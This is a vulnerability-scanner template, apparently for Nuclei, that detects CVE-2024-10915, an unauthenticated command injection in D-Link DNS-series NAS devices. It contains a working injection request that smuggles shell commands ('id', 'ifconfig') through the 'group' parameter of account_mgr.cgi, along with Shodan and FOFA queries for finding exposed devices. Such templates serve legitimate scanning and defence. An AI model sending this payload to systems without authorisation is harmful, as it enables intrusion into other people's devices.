http:
- matchers:
  - condition: or
    dsl:
    - regex('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', body)
    - contains_all(body, 'inet addr:', 'Mask:')
    type: dsl
  - condition: and
    dsl:
    - 'contains(body, "Content-type: text/html")'
    - status_code == 200
    type: dsl
  matchers-condition: and
  payloads:
    command:
    - id
    - ifconfig
  raw:
  - 'GET /cgi-bin/account_mgr.cgi?cmd=cgi_user_add&group=%27;{{command}};%27 HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2024-10915
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:o:dlink:dns-320_firmware:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-10915
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78,CWE-707
    epss-percentile: 0.99894
    epss-score: 0.94059
  description: 'A vulnerability was found in D-Link DNS-320, DNS-320LW, DNS-325 and
    DNS-340L up to 20241028. It has been rated as critical. Affected by this issue
    is the function cgi_user_add of the file /cgi-bin/account_mgr.cgi?cmd=cgi_user_add.
    The manipulation of the argument group leads to os command injection.

    '
  impact: 'Unauthenticated attackers can execute arbitrary OS commands via the group
    parameter, potentially compromising the entire D-Link NAS device.

    '
  metadata:
    fofa-query: body="sharecenter"
    max-request: 2
    product: dns-320_firmware
    shodan-query: http.html:"sharecenter"
    vendor: dlink
    verified: true
  name: D-Link NAS - Command Injection via Group Parameter
  reference:
  - https://www.usom.gov.tr/bildirim/tr-24-1836
  - https://netsecfish.notion.site/Command-Injection-Vulnerability-in-group-parameter-for-D-Link-NAS-12d6b683e67c803fa1a0c0d236c9a4c5?pvs=4
  - https://nvd.nist.gov/vuln/detail/CVE-2024-10915
  remediation: 'Update D-Link DNS-320, DNS-320LW, DNS-325, and DNS-340L firmware to
    versions released after 20241028.

    '
  severity: critical
  tags: cve,cve2024,dlink,sharecenter,rce,vuln,vkev
